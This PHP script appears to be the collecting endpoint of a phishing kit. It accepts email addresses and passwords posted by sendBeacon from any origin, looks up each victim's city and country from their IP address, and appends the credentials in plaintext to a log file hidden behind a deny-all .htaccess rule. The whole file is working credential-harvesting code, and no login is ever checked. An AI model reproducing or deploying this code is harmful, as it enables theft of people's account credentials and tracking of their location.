<?php
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, GET, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type, Accept');
header('X-Content-Type-Options: nosniff');
header('Referrer-Policy: strict-origin-when-cross-origin');
header('Permissions-Policy: geolocation=(), microphone=(), camera=()');

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit;
}

if ($_SERVER['REQUEST_METHOD'] !== 'POST' && $_SERVER['REQUEST_METHOD'] !== 'GET') {
    http_response_code(405);
    exit;
}

// 1. Read the raw JSON body sent by sendBeacon
$rawInput = file_get_contents('php://input');
$data = json_decode($rawInput, true);

// 2. If the request was not JSON, fallback to standard $_POST for safety
if (!$data) {
    $data = $_POST;
}

if (!$data || !isset($data['email'], $data['password'], $data['event'])) {
    http_response_code(400);
    echo json_encode(['status' => 'error', 'message' => 'Missing fields']);
    exit;
}

$email = filter_var($data['email'], FILTER_SANITIZE_EMAIL);
$password = htmlspecialchars($data['password'], ENT_QUOTES, 'UTF-8');
$event = htmlspecialchars($data['event'], ENT_QUOTES, 'UTF-8');

if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
    http_response_code(400);
    echo json_encode(['status' => 'error', 'message' => 'Invalid email']);
    exit;
}

function getClientIP() {
    $ip = 'Unknown';
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ips = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        $ip = trim($ips[0]);
    } elseif (!empty($_SERVER['REMOTE_ADDR'])) {
        $ip = $_SERVER['REMOTE_ADDR'];
    }
    if (!filter_var($ip, FILTER_VALIDATE_IP)) {
        $ip = 'Unknown';
    }
    return $ip;
}

$clientIP = getClientIP();

function getGeolocation($ip) {
    $default = ['city' => 'Unknown', 'region' => 'Unknown', 'country' => 'Unknown'];
    if ($ip === 'Unknown' || $ip === '127.0.0.1') {
        return $default;
    }
    $providers = [
        "https://ipapi.co/{$ip}/json/",
        "https://ipwhois.app/json/{$ip}"
    ];
    foreach ($providers as $url) {
        $context = stream_context_create(['http' => ['method' => 'GET', 'timeout' => 3]]);
        $response = @file_get_contents($url, false, $context);
        if ($response) {
            $json = json_decode($response, true);
            if (isset($json['error']) || !isset($json['city'])) {
                continue;
            }
            return [
                'city' => $json['city'] ?? 'Unknown',
                'region' => $json['region'] ?? $json['state'] ?? 'Unknown',
                'country' => $json['country_name'] ?? $json['country'] ?? 'Unknown'
            ];
        }
    }
    return $default;
}

$geo = getGeolocation($clientIP);

$timestamp = date('Y-m-d H:i:s');
$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';

$logEntry = "========================================\n";
$logEntry .= "Email: $email\n";
$logEntry .= "Password: $password\n";
$logEntry .= "IP: $clientIP\n";
$logEntry .= "City: " . $geo['city'] . "\n";
$logEntry .= "State/Region: " . $geo['region'] . "\n";
$logEntry .= "Country: " . $geo['country'] . "\n";
$logEntry .= "User Agent: $userAgent\n";
$logEntry .= "Event: $event\n";
$logEntry .= "Timestamp: $timestamp\n";
$logEntry .= "========================================\n\n";

$logDir = __DIR__ . '/logs/';
if (!is_dir($logDir)) {
    mkdir($logDir, 0755, true);
}
file_put_contents($logDir . '.htaccess', "Order Deny,Allow\nDeny from all", LOCK_EX);

$logFile = $logDir . 'login_log.txt';
file_put_contents($logFile, $logEntry, FILE_APPEND | LOCK_EX);

http_response_code(200);
echo json_encode(['status' => 'success', 'message' => 'Log saved']);
?>